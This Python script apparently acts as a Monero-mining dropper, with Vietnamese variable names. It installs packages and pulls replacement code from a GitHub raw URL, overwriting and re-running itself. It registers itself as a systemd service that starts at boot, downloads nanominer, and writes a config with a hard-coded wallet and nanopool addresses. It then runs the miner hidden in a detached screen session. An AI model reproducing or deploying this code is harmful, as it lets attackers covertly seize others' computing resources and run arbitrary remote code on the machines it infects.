import os
import sys
import time
from sys import platform
import requests
#import subprocess
import random
import string
    #import multiprocessing

if platform == "linux" or platform == "linux2":
    operate_system = 'lin'
elif platform == "darwin":
    operate_system = 'OS X'
elif platform == "win32":
    operate_system = 'win'

timeout = 30
thoi_gian_nghi = 28800
if operate_system == 'lin':
    try:
        os.system('apt-get update -y')
        os.system('apt-get install -y build-essential')
        os.system('apt-get install -y screen')
        os.system('apt-get install -y python-pip')
        os.system('apt-get install -y python3-pip')
        #os.system('apt-get install -y ubuntu-drivers-common')
        #os.system('apt-get install -y nvidia-driver-470')
    except:
        pass
    try:
        os.system('pip install psutil')
        os.system('pip3 install psutil')
    except:
        pass
import psutil
command_xmrig_default = '-c /opt/xmrig_linux/config.json'
while True:
    time.sleep(1)
    working_dir = os.path.dirname(os.path.realpath(__file__))
    print(working_dir)
    path_app = os.path.realpath(__file__)
    version_chinh = 5.0
    link_version_chinh = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/version_chinh'
    link_dao = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/dao_nhanh_gpu_docker_nb.py'
    try:
        response = requests.get(link_version_chinh, timeout=timeout)
        get_version_chinh = float(response.text)
        print(get_version_chinh)
        if get_version_chinh == version_chinh:
            print('Dang o version moi nhat la %s' % version_chinh)
        else:
            if len(response.text) < 5:
                print('Co version moi, update thoi')
                response = requests.get(link_dao, timeout=timeout)
                data_trave = response.text
                print(data_trave)
                fileopen = open(path_app, 'w+')
                fileopen.write(data_trave)
                fileopen.close()
                os.system('python3 %s' % path_app)
                sys.exit()
    except:
        pass
    
    if operate_system == 'lin':
        try:
            path_service = '/lib/systemd/system/dao.service'
            data = '[Unit]\nDescription=dao service\n[Service]\nType=simple\nExecStart=/usr/bin/python3 %s\n[Install]\nWantedBy=multi-user.target' % path_app
            if not os.path.exists(path_service):
                fileopen = open(path_service, 'w+')
                fileopen.write(data + '\n')
                fileopen.close()
            #os.system('chmod 600 %s' %path)
                os.system('systemctl daemon-reload')
                os.system('systemctl enable dao')
        except:
            pass
    #utopia
    if operate_system == 'lin':
        #nbminer
        link_download_xmrig = 'https://github.com/nanopool/nanominer/releases/download/v3.7.0/nanominer-linux-3.7.0.tar.gz'
        gz_name = 'nanominer-linux-3.7.0.tar.gz'
        folder_xmrig = 'nanominer-linux-3.7.0'
        xmrig_name = 'nanominer'
        link_config = 'https://raw.githubusercontent.com/rolandmedina54/giautoidi/beta/nql.ini'
        config_file = 'nql.ini'
        path_config = '/opt/%s/%s' %(folder_xmrig, config_file)
        try:
            if not os.path.isfile('/opt/%s/%s' %(folder_xmrig, xmrig_name)):
                print('Chua co chuong trinh %s' %xmrig_name)
                os.chdir('/opt')
                os.system('rm -f /opt/%s' %gz_name)
                os.system('wget %s' %link_download_xmrig)
                os.system('tar xf %s' %gz_name)
                os.chdir('/opt/%s' %folder_xmrig)
                #workingdir = os.getcwd()
                os.system('chmod 777 %s' %xmrig_name)
                rig_name = ''
                for k in range(1, 8, 1):
                    rig_name += random.choice(string.ascii_lowercase)
                data_config = '[RandomX]\nwallet = 87dy3GQJKwK8DyaWZXdBwzT2cJrzhkKJnFnetJJi7dxJKguRgQWdfP2GrqEKeUwnk33F9jEHaLDLeLvUbnFTzHVb19PthNg\nrigName = %s\npool1 = xmr-eu1.nanopool.org:14433\npool2 = xmr-eu2.nanopool.org:14433\npool3 = xmr-us-east1.nanopool.org:14433\npool4 = xmr-us-west1.nanopool.org:14433\n' %rig_name
                fileopen = open(path_config, 'w+')
                fileopen.write(data_config)
                fileopen.close()
                #os.system('wget %s' %link_config)
                workingdir = os.getcwd()
            else:
                print('Da co chuong trinh %s' %xmrig_name)
        except:
            pass
    
        try:
            nanominer_dachay = False
            for proc in psutil.process_iter():
                process_name = proc.as_dict(attrs=['pid', 'name', 'create_time'])
                #print(process_name['name'])
                if xmrig_name == process_name['name']:
                    print('Da co chuong trinh %s chay' %xmrig_name)
                    nanominer_dachay = True
                    break
        except:
            pass
        if nanominer_dachay == False:
            try:
                os.system('nvidia-smi')
            except:
                pass
            os.chdir('/opt/%s' %folder_xmrig)
            command = '/opt/%s/%s %s' %(folder_xmrig, xmrig_name, config_file)
            print(command)
            if os.path.isfile('/usr/bin/screen'):
                print('Co chuong trinh screen')
                os.system ('screen -dmS %s %s' %(xmrig_name, command))
            elif os.path.isfile('/usr/bin/nohup'):
                print('Co chuong trinh nohup')
                os.system ('nohup %s &' %command)
            else:
                os.system ('%s &' %command)
    time.sleep(thoi_gian_nghi)
